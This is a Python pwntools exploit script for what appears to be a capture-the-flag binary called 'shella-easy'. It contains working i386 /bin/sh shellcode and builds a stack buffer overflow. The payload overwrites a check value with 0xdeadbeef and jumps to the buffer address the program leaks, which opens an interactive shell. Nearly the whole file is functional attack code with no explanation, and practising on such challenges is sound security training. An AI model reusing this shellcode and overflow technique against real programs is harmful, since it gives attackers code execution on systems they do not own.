#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template shella-easy
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'shella-easy')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x8048000)
# Stack:    Executable
# RWX:      Has RWX segments

# context.logl_level = 'DEBUG'

shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
target_val = 0xdeadbeef
io = start()
io.recvuntil(b"have a ")
buffer_len = 64
buffer_addr = int(io.recv(10).decode()[2:], 16)
io.recvline()
io.sendline(shellcode + b"A"*(buffer_len - len(shellcode)) + p32(target_val) + p32(0)*2 + p32(buffer_addr))
io.interactive()

